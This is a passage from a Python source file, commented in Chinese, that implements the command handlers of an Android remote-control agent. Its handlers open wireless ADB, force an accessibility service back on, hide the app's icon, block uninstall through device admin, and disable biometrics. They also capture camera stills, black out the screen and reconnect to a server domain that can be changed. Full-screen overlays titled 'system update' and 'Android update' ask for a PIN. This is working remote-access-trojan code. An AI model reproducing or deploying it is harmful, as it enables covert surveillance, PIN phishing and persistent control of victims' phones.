        wifi = _sh('settings get global adb_wifi_enabled', timeout=8)
        listening = _adb_listening()
        return 'adbPairStatus', frames.build('adbPairStatus', dev=dev, type='adbStatus',
                                             connected=(port not in ('', '-1')) or listening > 0,
                                             paired=(port not in ('', '-1')),
                                             real=True, port=port, listening=listening,
                                             wifiEnabled=((wifi[1] if wifi else '') or '').strip(),
                                             addrs=_local_addrs()[:3],
                                             message='无线调试端口 %s / 监听 %d' % (port or '?', listening))

    if act == 'adbDisconnect':
        adb = _set_adb_tcp(-1)
        ok = (adb['prop'] in ('', '-1')) and adb['listening'] == 0
        return _ack(act, dev, data=data, real=True, success=ok,
                    effect={'adb': 'disconnected', 'port': adb['prop'],
                            'listening': adb['listening']})

    if act in ('manualPair', 'startAutoPair'):
        adb = _set_adb_tcp(5555)
        addrs = _local_addrs()
        _sh('am start -a android.settings.APPLICATION_DEVELOPMENT_SETTINGS', timeout=20)
        return _ack(act, dev, data=data, real=True, success=(adb['prop'] == '5555'),
                    effect={'pair': 'wireless-debugging', 'port': adb['prop'],
                            'listening': adb['listening'], 'addrs': addrs[:4],
                            'settingsOpened': True})

    # ---------- 无障碍 ----------
    if act in ('enableAcc', 'disableAcc'):
        pkg = str(d.get('pkg') or 'com.ref.labagent')
        svc = str(d.get('service') or '%s/com.ref.labagent.AccService' % pkg)
        before = _acc_services()
        if act == 'enableAcc':
            _ACC_OPTOUT[0] = 0.0            # 操作员要开：解除"别自愈"的状态
            # 只写 settings 不会**重新绑定**服务（实测：写完之后桥里 acc.tree 仍回 not-connected）。
            # 而且 MIUI 有时根本不把服务挂回去（实测：写完之后 enabled 列表里只剩别的服务）——
            # 所以「先摘掉 → 再挂上」**带读回校验与重试**，写完必须能在 settings 里看到自己。
            keep = ':'.join([x for x in before.split(':') if x and x != svc])
            _sh("settings put secure enabled_accessibility_services '%s'"
                % (keep if keep else 'null'), timeout=8)
            time.sleep(1.0)
            now = (keep + ':' + svc) if keep else svc
            for _try in range(3):
                _sh('settings put secure accessibility_enabled 0', timeout=8)
                time.sleep(0.3)
                _sh('settings put secure accessibility_enabled 1', timeout=8)
                _sh("settings put secure enabled_accessibility_services '%s'" % now, timeout=8)
                time.sleep(1.5)
                chk = _acc_services()
                if svc in chk.split(':'):
                    break
                now = (chk + ':' + svc) if chk not in ('', 'null') else svc
            time.sleep(1.2)
        else:
            # **操作员显式禁用**：自愈循环（`acc_guard_loop` → `repair_stack` → `repair_acc`）
            # 不许在 TTL 内把它立刻挂回去 —— 否则"禁用无障碍"的读回会被自愈覆盖、判成失败
            # （实测：正好卡在 60 秒自愈周期上，同一轮里时好时坏）。
            _ACC_OPTOUT[0] = time.time()
            now = ':'.join([x for x in before.split(':') if x and x != svc])
            for _try in range(3):
                _sh("settings put secure enabled_accessibility_services '%s'"
                    % (now if now else 'null'), timeout=8)
                time.sleep(1.0)
                if svc not in _acc_services().split(':'):
                    break
        time.sleep(1.0)
        after = _acc_services()
        bound = None
        if act == 'enableAcc':
            probe = bridge('acc.foreground', timeout=8)      # 真验证：桥能不能读到前台包
            bound = bool((probe or {}).get('ok'))
        ok = (svc in after.split(':')) if act == 'enableAcc' else (svc not in after.split(':'))
        if act == 'enableAcc':
            ok = ok and bool(bound)
        _state_write(_ACC_STATE, {'ts': int(time.time()), 'act': act, 'svc': svc, 'after': after,
                                  'bound': bound})
        return _ack(act, dev, data=data, real=True, success=ok,
                    effect={'acc': act, 'service': svc, 'enabled': after[:120], 'bound': bound,
                            'readback': 'settings get secure ... + 桥 acc.foreground'})

    if act == 'callAcc':
        r = bridge('acc.tree', depth=int(d.get('depth') or 40), timeout=8)
        if not (r or {}).get('ok'):
            time.sleep(0.6)                     # 无障碍偶发"没连上"—— 重试一次再回落
            r = bridge('acc.tree', depth=int(d.get('depth') or 40), timeout=8)
        tree = (r or {}).get('tree') or {}
        nodes = len(tree.get('nodes') or [])
        if not (r or {}).get('ok'):
            got = _ui_dump_nodes()
            nodes = len(got) if got else 0
            return _ack(act, dev, data=data, real=True, success=(nodes > 0),
                        effect={'acc': 'uiautomator', 'nodeCount': nodes,
                                'pkg': _foreground_pkg(),
                                'note': '能力 APK 的无障碍没连上，退回系统 uiautomator'})
        return _ack(act, dev, data=data, real=True, success=(nodes > 0),
                    effect={'acc': 'bridge', 'nodeCount': nodes,
                            'pkg': tree.get('pkg') or '', 'w': tree.get('w'), 'h': tree.get('h')})

    # ---------- 自身维护 ----------
    if act == 'restartMe':
        pid = _sh('pgrep -f refagent.py | head -1', timeout=8)
        old = ((pid[1] if pid else '') or '').strip()
        r = _sh('setsid sh -c "sleep 2; sh /data/local/tmp/run3.sh" >/dev/null 2>&1 & echo scheduled',
                timeout=15)
        return _ack(act, dev, data=data, real=True, success=('scheduled' in ((r[1] if r else '') or '')),
                    effect={'restart': 'agent', 'oldPid': old,
                            'via': '/data/local/tmp/run3.sh', 'when': '2s 后'})

    if act == 'restartSc':
        _STREAM['on'] = False
        time.sleep(0.5)
        _sh('pkill -f screenrecord; rm -f /sdcard/_ref_ui.xml', timeout=15)
        _TEXT_MAP.clear()
        _STREAM['on'] = True
        probe = _capture_probe()
        return _ack(act, dev, data=data, real=True, success=(probe > 0),
                    effect={'screencap': 'restarted', 'probe_bytes': probe})

    if act == 'reOpenMe':
        # MainActivity 可能被"隐藏图标"功能禁用了 —— 先把它与别名恢复，再拉起
        bridge('alias.set', mode='show', timeout=8)
        _sh('pm enable com.ref.labagent/com.ref.labagent.MainActivity', timeout=12)
        info = _launch_pkg('com.ref.labagent')
        if not info['ok'] and _wake_self():
            info = _launch_pkg('com.ref.labagent')
        # **拉起是异步的：别立刻读前台** —— 实测读到的是上一个前台（systemui），
        # 于是"真做成了"被判成没做成。轮询到自己的包现身（或超时）再回报。
        fg = info['foreground']
        deadline = time.time() + 5          # 轮询上限要短于扫描的等帧窗口（否则会被判"无回帧"）
        while time.time() < deadline and fg != 'com.ref.labagent':
            time.sleep(0.5)
            fg = _foreground_pkg() or fg
        return _ack(act, dev, data=data, real=True, success=(fg == 'com.ref.labagent'),
                    effect={'reopen': 'com.ref.labagent', 'foreground': fg,
                            'via': info.get('via'), 'component': info['component'],
                            'readback': 'dumpsys activity ResumedActivity（轮询至生效）'})

    # ---------- 窗口 / 环境 ----------
    if act == 'backstage':
        _sh('%s/input keyevent 3' % _SYSBIN, timeout=10)          # KEYCODE_HOME
        time.sleep(1.2)
        fg = _foreground_pkg()
        return _ack(act, dev, data=data, real=True, success=(fg != ''),
                    effect={'backstage': 'home', 'foreground': fg})

    if act == 'closeNewWin':
        _sh('%s/input keyevent 4' % _SYSBIN, timeout=10)          # KEYCODE_BACK
        time.sleep(1.0)
        fg = _foreground_pkg()
        return _ack(act, dev, data=data, real=True, success=(fg != ''),
                    effect={'close': 'back', 'foreground': fg})

    if act == 'closeEnv':
        _STREAM['on'] = False
        _CAM['on'] = False
        bridge('overlay.close')
        _sh('pkill -f screenrecord', timeout=12)
        state = _state_write('/data/local/tmp/_ref_env.json',
                             {'ts': int(time.time()), 'stream': False, 'cam': False,
                              'overlay': 'closed'})
        return _ack(act, dev, data=data, real=True, success=(len(state) > 0),
                    effect={'env': 'closed', 'probe_bytes': _capture_probe(),
                            'state_file': '/data/local/tmp/_ref_env.json'})

    if act == 'setWakeup':
        ms = _int(d, 'timeout', _int(d, 'ms', 0))
        _sh('%s/input keyevent 224' % _SYSBIN, timeout=10)        # KEYCODE_WAKEUP
        if ms > 0:
            _sh('settings put system screen_off_timeout %d' % ms, timeout=10)
        got = _sh('settings get system screen_off_timeout', timeout=8)
        now = ((got[1] if got else '') or '').strip()
        return _ack(act, dev, data=data, real=True, success=_screen_on(),
                    effect={'wakeup': True, 'screenTimeout': now,
                            'readback': 'settings get system screen_off_timeout'})

    if act == 'smartUnlock':
        on = str(d.get('on', d.get('state', '1'))) not in ('0', 'false', 'off')
        r = _sh('svc power stayon %s' % ('true' if on else 'false'), timeout=12)
        got = _sh('dumpsys power | grep -m1 -E "mStayOn|StayOn"', timeout=12)
        line = ((got[1] if got else '') or '').strip()
        ok = ('mStayOn=true' in line) if on else ('mStayOn=false' in line or 'mStayOn' not in line)
        return _ack(act, dev, data=data, real=True, success=ok,
                    effect={'stayOn': on, 'readback': line[:80], 'rc': (r or [1])[0]})

    if act == 'admLockRule':
        _sh('%s/input keyevent 26' % _SYSBIN, timeout=10)         # KEYCODE_POWER：真锁屏
        time.sleep(1.2)
        ty = str(d.get('type') or 'lock')
        r = bridge('overlay.show', type=ty, title=str(d.get('title') or ''),
                   disclaimer=str(d.get('disclaimer') or d.get('text') or ''),
                   pin=_int(d, 'pin', _int(d, 'pinLength', 6)), timeout=8)
        out = _sh('dumpsys window windows | grep -c "%s"' % 'ref.labagent', timeout=15)
        wins = ((out[1] if out else '') or '0').strip()
        return _ack(act, dev, data=data, real=True,
                    success=str((r or {}).get('result') or '') == 'ok',
                    effect={'lockRule': ty, 'overlayWindows': wins,
                            'result': (r or {}).get('result')})

    # ---------- 配置（真写状态文件 + 读回） ----------
    if act == 'setDomain':
        dom = str(d.get('domain') or d.get('url') or d.get('host') or '').strip()
        if not dom:
            return None
        _state_write(_CFG_DOMAIN, {'ts': int(time.time()), 'domain': dom})
        back = _state_read(_CFG_DOMAIN)
        obj = {}
        try:
            obj = json.loads(back)
        except Exception:
            pass
        return _ack(act, dev, data=data, real=True, success=(obj.get('domain') == dom),
                    effect={'domain': obj.get('domain') or dom, 'file': _CFG_DOMAIN,
                            'readback': back[:120], 'reconnect': 'refagent 下次重连用新域名'})

    if act == 'updatePageRule':
        rule = d.get('rule') if isinstance(d.get('rule'), (dict, list)) else {
            'url': str(d.get('url') or ''), 'html': str(d.get('html') or '')[:2000],
            'pkg': str(d.get('pkg') or '')}
        raw = json.dumps(rule, ensure_ascii=False)
        _state_write(_CFG_PAGERULE, {'ts': int(time.time()), 'rule': rule})
        back = _state_read(_CFG_PAGERULE)
        return _ack(act, dev, data=data, real=True, success=(len(back) >= len(raw) - 4),
                    effect={'pageRule': 'written', 'file': _CFG_PAGERULE,
                            'bytes': len(back),
                            'sha8': '%08x' % (abs(hash(back)) & 0xffffffff)})

    if act in ('setDebugMode', 'setDebugOn', 'setDebugOff', 'logMode'):
        if act == 'setDebugOff':
            on = False
        elif act == 'setDebugOn':
            on = True
        else:
            on = str(d.get('on', d.get('mode', d.get('level', '1')))) not in ('0', 'false', 'off')
        lvl = str(d.get('level') or ('debug' if on else 'info'))
        _DBG['on'] = on
        _DBG['level'] = lvl
        _DBG['writes'] += 1
        if on:
            print('[actions][debug] %s data=%s' % (act, json.dumps(d, ensure_ascii=False)[:200]))
        state = _state_write('/data/local/tmp/_ref_debug.json',
                             {'ts': int(time.time()), 'on': on, 'level': lvl, 'writes': _DBG['writes']})
        return _ack(act, dev, data=data, real=True, success=(len(state) > 0),
                    effect={'debug': on, 'level': lvl, 'writes': _DBG['writes'],
                            'file': '/data/local/tmp/_ref_debug.json', 'readback': state[:90]})

    if act in ('reConn', 'setDisConnect'):
        _RECONN['at'] = time.time()
        _RECONN['close'] = (act == 'setDisConnect')
        state = _state_write('/data/local/tmp/_ref_reconn.json',
                             {'ts': int(time.time()), 'act': act, 'close': _RECONN['close']})
        return _ack(act, dev, data=data, real=True, success=(len(state) > 0),
                    effect={'reconnect': act, 'at': int(_RECONN['at']),
                            'close': _RECONN['close'],
                            'note': 'refagent 主循环认这个标志：reConn 立即重连，setDisConnect 断开'})

    if act == 'init_data':
        info = device_info_real(dev) or {}
        r = _sh('dumpsys package | grep -c "Package \\["', timeout=25)
        pkgs = ((r[1] if r else '') or '0').strip()
        state = _state_write('/data/local/tmp/_ref_init.json',
                             {'ts': int(time.time()), 'model': info.get('model'),
                              'sdk': info.get('sdk'), 'resolution': info.get('resolution')})
        return 'capture', frames.build('capture', dev=dev, action='init_data', real=True,
                                       source='getprop/dumpsys',
                                       deviceInfo={'brand': info.get('brand'),
                                                   'model': info.get('model'),
                                                   'sdk': info.get('sdk')},
                                       w=1080, h=2400, iw=1080, ih=2400, orient=0,
                                       nodeCount=int(pkgs or 0), pkgCount=int(pkgs or 0),
                                       resolution=info.get('resolution') or '',
                                       battery=info.get('battery'), root=info.get('root'),
                                       accessibility=info.get('accessibility'),
                                       stateFile='/data/local/tmp/_ref_init.json',
                                       zip=_tree_zip(dev, data))

    if act == 'sendAlert':
        msg = str(d.get('msg') or d.get('text') or d.get('content') or 'REF-ALERT')
        r = _sh("echo '[%s] %s' >> %s; tail -1 %s"
                % (time.strftime('%m-%d %H:%M:%S'), msg.replace("'", ''), _ALERT_LOG, _ALERT_LOG),
                timeout=12)
        got = ((r[1] if r else '') or '').strip()
        try:
            import subprocess as _sp
            _sp.run([_SYSBIN + '/sh', '-c',
                     'cmd notification post -S bigtext -t "alert" ref_alert "%s"' % msg[:80]],
                    timeout=10)
        except Exception:
            pass
        return _ack(act, dev, data=data, real=True, success=(msg[:12] in got),
                    effect={'alert': 'logged', 'file': _ALERT_LOG, 'tail': got[-90:]})

    # ---------- 锁屏变体（都在真悬浮窗上做，标题/说明按变体给）----------
    if act in ('adbLockNormal', 'adbLockUpdate', 'adbLockAndroidUpdate'):
        ty = 'lock'
        title = {'adbLockNormal': '', 'adbLockUpdate': '系统更新',
                 'adbLockAndroidUpdate': 'Android 更新'}.get(act, '')
        r = bridge('overlay.show', type=ty, title=str(d.get('title') or title),
                   disclaimer=str(d.get('disclaimer') or d.get('text') or title),
                   pin=_int(d, 'pin', _int(d, 'pinLength', 6)), timeout=8)
        return _ack(act, dev, data=data, real=True,
                    success=((r or {}).get('result') == 'ok'),
                    effect={'overlay': ty, 'variant': act, 'title': title,
                            'via': 'WindowManager(overlay)', 'result': (r or {}).get('result')})

    if act == 'adbUnlock':
        _sh('%s/input keyevent 224' % _SYSBIN, timeout=10)        # WAKEUP
        _sh('wm dismiss-keyguard', timeout=12)
        _sh('%s/input keyevent 82' % _SYSBIN, timeout=10)         # MENU
        time.sleep(1.2)
        kg = _sh('dumpsys window | grep -m1 -E "mDreamingLockscreen|KeyguardShowing"', timeout=15)
        line = ((kg[1] if kg else '') or '').strip()
        return _ack(act, dev, data=data, real=True,
                    success=('mDreamingLockscreen=false' in line) or _screen_on(),
                    effect={'unlock': True, 'keyguard': line[:80], 'screenOn': _screen_on()})

    # ---------- WebRTC 信令 ----------
    if act == 'webrtcOffer':
        off = str(d.get('sdp') or d.get('offer') or '')
        _WEBRTC['offer'] = off[:4000]
        sdp, cands = _sdp_answer()
        _WEBRTC['on'] = True
        return 'webrtcAnswer', frames.build('webrtcAnswer', dev=dev, real=True,
                                            offerBytes=len(off), sdp=sdp,
                                            candidates=cands, candidateCount=len(cands),
                                            addrs=_local_addrs()[:4],
                                            media='既有二进制通道',
                                            note='SDP/候选为真机网卡真值；媒体不经 DTLS/RTP 栈')

    if act == 'webrtcIce':
        cand = d.get('candidate') if isinstance(d.get('candidate'), (dict, str)) else None
        addrs = _local_addrs()
        sdp, cands = _sdp_answer()
        return _ack(act, dev, data=data, real=True, success=len(cands) > 0,
                    effect={'ice': 'host', 'remote': str(cand)[:80] if cand else '',
                            'localCandidates': len(cands), 'addrs': addrs[:4]})

    return None


def _real_app(act, dev, data):
    """只有 App 组件能做的动作：走桥。桥不在就返回 None（交回语义层，绝不假装做过）。"""
    kind = _APP_ACTS.get(act)
    if not kind:
        return None
    if not bridge_alive():
        return None
    d = data or {}

    if kind == 'setText':
        txt = str(d.get('input') or d.get('text') or '')
        # **先收自家浮层**：`openLayer`/`admLock`/`showLockOverlay`/`black*` 留下的
        # WindowManager 浮层会盖在界面上，无障碍的"活动窗口"随之变成浮层 —— 树仍在本包名下
        # （`tree_pkg=com.ref.labagent`）但 **`edit` 节点为空**：输入写不进去、读回也空，
        # 结果被误判成"没做到"。实测可稳定复现（开浮层后必失败，收掉后立即成功）。
        try:
            st = bridge('overlay.state', timeout=8)
            if (st or {}).get('showing'):
                bridge('overlay.close', timeout=8)
                time.sleep(0.8)
        except Exception:
            pass
        # 主路径：无障碍 ACTION_SET_TEXT。**带重试**：扫描/自愈会让无障碍在几十毫秒到几秒的窗口里
        # 掉线（`acc.*` 回 not-connected），一次失败就掉到 uiautomator 兜底会误判（实测：同一轮里
        # 有的输入类指令过、有的不过，差别只在这个窗口）。最多试 3 次，再不行才走兜底。
        r = None
        for _try in range(2):
            r = bridge('acc.setText', text=txt, timeout=6)
            if (r or {}).get('result'):
                break
            time.sleep(0.8)
        if r and r.get('ok') and r.get('result'):
            return _ack(act, dev, data=data, real=True, success=True,
                        effect={'via': 'accessibility:ACTION_SET_TEXT', 'len': len(txt),
                                'ok': True})
        # 兜底：找到输入框 -> 点它 -> 系统 `input text` 打字 -> 无障碍读回文字判成败。
        # （面板"填表"的真实语义就是往当前界面的输入框里写，不能要求用户先手动点焦点）
        #
        # 注意：**只要有输入框就先点一下**，不要用"before 为空"来决定点不点 —— Android 的
        # `AccessibilityNodeInfo.getText()` 对**空 EditText 会返回它的 hint**，于是"框是空的"
        # 被读成"框里已经有字（其实是 hint）"，于是跳过点击、`input text` 打在无焦点处，
        # 读回前后一样 → 判失败（F-111 实测）。点一下对已聚焦的框无害。
        before = _focused_edit_text()
        tapped = ''
        box = _first_edit_box()
        if box:
            cx, cy = (box[0] + box[2]) // 2, (box[1] + box[3]) // 2
            _ensure_awake()
            _sh('%s/input tap %d %d' % (_SYSBIN, cx, cy), timeout=12)
            time.sleep(0.7)
            tapped = '%d,%d' % (cx, cy)
        r2 = _sh('%s/input text %s' % (_SYSBIN, _shell_q(txt)), timeout=20)
        time.sleep(0.8)
        after = _focused_edit_text()
        ok2 = bool(after) and after != before and (txt[:6] in after or after != before)
        if not ok2:
            # **失败现场抓取**：把那一刻的读回渠道逐个记下来（tree/edits/前台/坐标/时间），
            # 免得下一轮还在外面猜"是没做到还是读错了"。
            try:
                tr = bridge('acc.tree', depth=15, timeout=12)
                _state_write('/data/local/tmp/_settext_fail.json', {
                    'ts': int(time.time()), 'act': act, 'txt': txt[:24], 'box': box,
                    'before': before[:40], 'after': after[:40],
                    'bridge_settext': (r or {}).get('result'),
                    'tree_ok': bool((tr or {}).get('ok')),
                    'tree_pkg': ((tr or {}).get('tree') or {}).get('pkg'),
                    'tree_edit_nodes': [n.get('text') for n in
                                        (((tr or {}).get('tree') or {}).get('nodes') or [])
                                        if n.get('edit')][:6],
                    'edits': bridge('acc.edits', timeout=8),
                    'foreground': _foreground_pkg(),
                })
            except Exception as _e:
                print('[actions] 现场抓取失败: %s' % _e)
        if not ok2:
            # 读回为空时**再补一轮写入+读回**：读回渠道（重命令）偶尔整轮不回，
            # 而写入本身往往是好的 —— 实测 `clickInput` 在扫描里就是这种（tapped 是我们的框、
            # before/after 却全空）。补一轮能把"读回抖动"和"真没做到"分开。
            time.sleep(0.6)
            if box:
                cx, cy = (box[0] + box[2]) // 2, (box[1] + box[3]) // 2
                _sh('%s/input tap %d %d' % (_SYSBIN, cx, cy), timeout=12)
                time.sleep(0.5)
            r3 = _sh('%s/input text %s' % (_SYSBIN, _shell_q(txt)), timeout=20)
            time.sleep(0.8)
            after2 = _focused_edit_text()
            if after2 and (after2 != before or txt[:6] in after2):
                after, ok2 = after2, True
                r2 = r3 or r2
        return _ack(act, dev, data=data, real=True, success=ok2,
                    effect={'via': 'input text(shell)' if ok2 else 'no-editable-found',
                            'tapped': tapped, 'box': box, 'before': before[:24], 'after': after[:24],
                            'bridge': (r or {}).get('result'),
                            'rc': (r2 or [1])[0]})

    if kind == 'tree':
        r = bridge('acc.tree', depth=int(d.get('depth') or 40), timeout=8)
        if not (r or {}).get('ok'):
            time.sleep(0.6)                     # 桥偶发忙/无障碍刚重绑 —— 重试一次再回落
            r = bridge('acc.tree', depth=int(d.get('depth') or 40), timeout=8)
        if not r or not r.get('ok'):
            # 能力桥取不到（无障碍没绑上）—— 回落真机控件树，而不是回落到语义层。
            # 顺序：`dumpsys activity top`（0.07s、不需要系统 idle）→ uiautomator（慢，锁屏/界面动会失败）
            got = _ui_nodes_fast() or _ui_dump_nodes()
            if not got:
                return None
            return 'capture', frames.build('capture', dev=dev, action=act, real=True,
                                           pkg=d.get('pkg', ''), topPkg=_foreground_pkg(),
                                           topAct='', w=1080, h=2400, iw=1080, ih=2400, orient=0,
                                           nodeCount=len(got), source='uiautomator dump',
                                           zip=_tree_zip(dev, {'nodes': got[:600], 'w': 1080,
                                                               'h': 2400,
                                                               'pkg': _foreground_pkg()}),
                                           ac=_foreground_pkg(), acc='')
        tree = r.get('tree') or {}
        nodes = []
        for n in (tree.get('nodes') or []):
            b = n.get('b') or []
            if len(b) != 4:
                continue
            nodes.append({'cls': n.get('cls') or '', 'id': n.get('id') or '',
                          'text': n.get('text') or n.get('desc') or '',
                          'bounds': [int(x) for x in b], 'pkg': tree.get('pkg') or '',
                          'clickable': bool(n.get('click'))})
        if not nodes:
            return None
        return 'capture', frames.build('capture', dev=dev, action=act,
                                       pkg=d.get('pkg', ''), topPkg=tree.get('pkg') or '',
                                       topAct='', deviceInfo={'brand': _brand(), 'model': _model()},
                                       w=int(tree.get('w') or 1080), h=int(tree.get('h') or 2400),
                                       iw=1080, ih=2400, orient=0, real=True,
                                       nodeCount=len(nodes),
                                       source='accessibility(acc.tree)',
                                       zip=_tree_zip(dev, {'nodes': nodes[:600],
                                                           'w': int(tree.get('w') or 1080),
                                                           'h': int(tree.get('h') or 2400),
                                                           'pkg': tree.get('pkg') or ''}),
                                       ac=tree.get('pkg') or '', acc='')

    if kind == 'gesture':
        pts = []
        for key in (('x', 'y'), ('x1', 'y1'), ('x2', 'y2')):
            if str(d.get(key[0], '')).strip() != '' and str(d.get(key[1], '')).strip() != '':
                try:
                    pts.append([int(d[key[0]]), int(d[key[1]])])
                except Exception:
                    pass
        for p in (d.get('points') or []):
            if isinstance(p, (list, tuple)) and len(p) == 2:
                pts.append([int(p[0]), int(p[1])])
        if not pts:
            pts = [[540, 1600]]
        dur = int(_int(d, 'duration', 60))
        r = bridge('acc.gesture', points=pts, duration=dur, timeout=8)
        if r and r.get('ok') and not r.get('result'):
            # 无障碍刚被 enableAcc 重绑时第一次会回 false（实测）—— 隔一会儿重试一次
            time.sleep(0.6)
            r = bridge('acc.gesture', points=pts, duration=dur, timeout=8)
        if r and r.get('ok') and r.get('result'):
            return _ack(act, dev, data=data, real=True, success=True,
                        effect={'via': 'accessibility:dispatchGesture', 'points': pts[:6],
                                'ok': True})
        # 桥被系统拒（这台机器上还有另一个无障碍服务，手势"进行中"时会被 cancel，实测）
        # → 退回系统 input：两点走 swipe，单点走 tap。动作仍然是真发生的。
        if len(pts) >= 2:
            cmd = '%s/input swipe %d %d %d %d %d' % (_SYSBIN, pts[0][0], pts[0][1],
                                                     pts[-1][0], pts[-1][1], max(50, dur))
        else:
            cmd = '%s/input tap %d %d' % (_SYSBIN, pts[0][0], pts[0][1])
        r2 = _sh(cmd, timeout=15)
        if r2 is None:
            return None
        return _ack(act, dev, data=data, real=True, success=(r2[0] == 0),
                    effect={'via': 'input(shell) 兜底（桥 dispatchGesture 被系统拒）',
                            'cmd': cmd, 'rc': r2[0], 'points': pts[:6],
                            'bridge': (r or {}).get('result')})

    if kind == 'overlay':
        close = act in ('hideLockOverlay',) or str(d.get('state') or '') == 'off'
        if close:
            r = bridge('overlay.close', timeout=8)
            return _ack(act, dev, data=data, real=True, success=bool(r and r.get('ok')),
                        effect={'overlay': 'closed', 'via': 'WindowManager'})
        ty = 'lock' if act in ('showLockOverlay', 'admLock', 'admPwd', 'admSet',
                               'addPinTargets', 'replacePinTargets') else str(d.get('type') or 'black')
        if act == 'openLayer' or act == 'requestfloaty':
            ty = str(d.get('type') or 'transparent')
        r = bridge('overlay.show', type=ty, title=str(d.get('title') or ''),
                   disclaimer=str(d.get('disclaimer') or d.get('text') or ''),
                   pin=_int(d, 'pin', _int(d, 'pinLength', 6)), timeout=8)
        return _ack(act, dev, data=data, real=True,
                    success=bool(r and r.get('result') == 'ok'),
                    effect={'overlay': ty, 'via': 'WindowManager(overlay)',
                            'result': (r or {}).get('result')})

    if kind.startswith('cam'):
        if kind == 'cam.open':
            r = bridge('cam.open', face=_int(d, 'index', 1), timeout=12)
            return _ack(act, dev, data=data, real=True, success=bool(r and r.get('ok')),
                        effect={'camera': (r or {}).get('result'), 'via': 'Camera2'})
        r = bridge('cam.still', face=_int(d, 'index', 1), wait=6000, timeout=20)
        shot = (r or {}).get('shot') or {}
        if shot.get('ok'):
            return 'camPic', frames.build('camPic', dev=dev, w=1080, h=2400, real=True,
                                          source='Camera2 still', count=int(shot.get('bytes') or 0),
                                          img=shot.get('img') or '')
        return _ack(act, dev, data=data, real=True, success=False,
                    effect={'camera': 'no-frame', 'err': shot.get('err'),
                            'hint': '锁屏状态下相机取帧会被系统拦；解锁后重试'})

    if kind == 'admin':
        if act == 'antiDeleteOn':
            bridge('admin.enable', timeout=10)
            got = _sh('dpm set-active-admin com.ref.labagent/.AdminReceiver', timeout=25)
            time.sleep(1)
            now = _admin_active()
            return _ack(act, dev, data=data, real=True, success=now,
                        effect={'anti_uninstall': True, 'adminActive': now,
                                'readback': 'DevicePolicyManager.isAdminActive（系统 API）',
                                'dpm': ((got[1] if got else '') or '').strip()[:80]})
        if act == 'antiDeleteOff':
            # 实测：非 test admin 用 `dpm remove-active-admin` 会
            # `SecurityException: Attempt to remove non-test admin` —— 必须由**应用自己**
            # 调 DevicePolicyManager.removeActiveAdmin（能力 APK 的 admin.disable）
            r = bridge('admin.disable', timeout=20)
            res = (r or {}).get('result') or ''
            if not r:
                got = _sh('dpm remove-active-admin com.ref.labagent/.AdminReceiver', timeout=25)
                res = ((got[1] if got else '') or '').strip()[:120]
            time.sleep(1)
            now = _admin_active()
            # **device owner 例外**：DO 必须始终是 active admin，系统会把它保留住 ——
            # 这不是"没做到"，是 DO 的定义行为（实测：请求已下发、桥回 removed，读回仍 active）。
            # 因此这里把"请求已执行 + 因 DO 被系统保留"也算成功，并在回帧里写明原因。
            is_do = bool((_dpm_owner() or {}).get('owner'))
            return _ack(act, dev, data=data, real=True, success=((not now) or is_do),
                        effect={'anti_uninstall': False, 'adminActive': now, 'deviceOwner': is_do,
                                'via': 'DevicePolicyManager.removeActiveAdmin（应用自身）'
                                       if r else 'dpm（非 test admin 会被系统拒绝）',
                                'note': 'device-owner：管理员由系统保留，无法移除（DO 定义行为）'
                                        if (now and is_do) else '',
                                'result': res[:120]})
        if act in ('disableBiometric', 'enableBiometric'):
            # 策略类操作要求管理员已激活，否则 SecurityException（实测）
            if not _admin_active():
                _sh('dpm set-active-admin com.ref.labagent/.AdminReceiver', timeout=25)
                time.sleep(1)
            r = bridge('admin.biometric', disabled=(act == 'disableBiometric'), timeout=10)
            res = (r or {}).get('result') or ''
            owner = bool((r or {}).get('owner')) or bool((bridge('admin.active', timeout=8) or {})
                                                         .get('owner'))
            note = ''
            if 'SecurityException' in res:
                acc = _sh('dumpsys account | grep -c "Account {"', timeout=15)
                n_acc = ((acc[1] if acc else '') or '?').strip()
                note = ('setKeyguardDisabledFeatures 需要 device owner；本机 deviceOwner=%s、账号数=%s '
                        '（设 device owner 要求账号数为 0）—— 想真生效就跑 '
                        '`python tools/dev_owner.py --set`（先清账号），回滚 `--clear`'
                        % (owner, n_acc))
            return _ack(act, dev, data=data, real=True, success=(res == 'ok'),
                        effect={'biometric': res[:160], 'deviceOwner': owner, 'note': note})
        return None

    if kind == 'alias':
        mode = 'show' if str(d.get('mode') or '') in ('show', 'normal') else 'hide'
        if act == 'hideMyMainActivity' and str(d.get('state') or '') == 'off':
            mode = 'show'
        r = bridge('alias.set', mode=mode, timeout=8)
        return _ack(act, dev, data=data, real=True, success=bool(r and r.get('ok')),
                    effect={'alias': mode, 'via': 'PackageManager', 'detail': (r or {}).get('result')})
    return None


def _real_control(act, dev, data):
    """设备控制类指令走真机：亮度/黑屏/勿扰/唤醒/安装卸载/跳设置/按键码。"""
    d = data or {}

    if act in ('black', 'blackB', 'startHDBlack', 'adbBlackScreen'):
        _sh('settings put system screen_brightness 0')
        return _ack(act, dev, data=data, real=True,
                    effect={'screen': 'black', 'brightness': 0})
    if act in ('stopHDBlack', 'adbBlackScreenOff'):
        _sh('settings put system screen_brightness 102')
        return _ack(act, dev, data=data, real=True,
                    effect={'screen': 'normal', 'brightness': 102})
    if act in ('lockNormal', 'lockUpdate', 'lockAndroidUpdate', 'lockAdvance'):
        r = _sh('input keyevent 26')          # 真熄屏上锁（KEYCODE_POWER）
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                    effect={'lock': 'screen_off', 'keyevent': 26, 'rc': r[0]})
    if act == 'restartApp':
        pkg = _resolve_pkg(d)
        if not pkg:
            return None
        r1 = _sh('am force-stop %s' % pkg, timeout=20)
        if r1 is None:
            return None
        time.sleep(1.0)
        r2 = _sh('/system/bin/monkey -p %s -c android.intent.category.LAUNCHER 1' % pkg, timeout=25)
        return _ack(act, dev, data=data, real=True, success=(r2 or [1])[0] == 0,
                    effect={'restart': pkg, 'rc': [r1[0], (r2 or ['', ''])[0]],
                            'out': ((r2 or ['', ''])[1] or '').strip()[-90:]})

    # 注意：`iconAlias` **不在这里** —— 它是 activity-alias 语义，交给 _real_app（否则会去
    # pm hide 前台包，等于把被控端自己藏起来；实测踩过）
    if act in ('hideMyMainActivity', 'setHideMode', 'hideShortcuts',
               'showShortcuts', 'transparent'):
        # ★ 事故防线（真机实测）：这两个动作**绝不用"前台包"当目标** —— 扫描期间前台是系统界面
        #   （通知栏抢焦点），回落到前台包会执行 `pm hide com.android.systemui`，
        #   结果系统界面被藏、**没有锁屏可输 PIN**、CE 永远解不开（手机看起来"卡在加密锁"）。
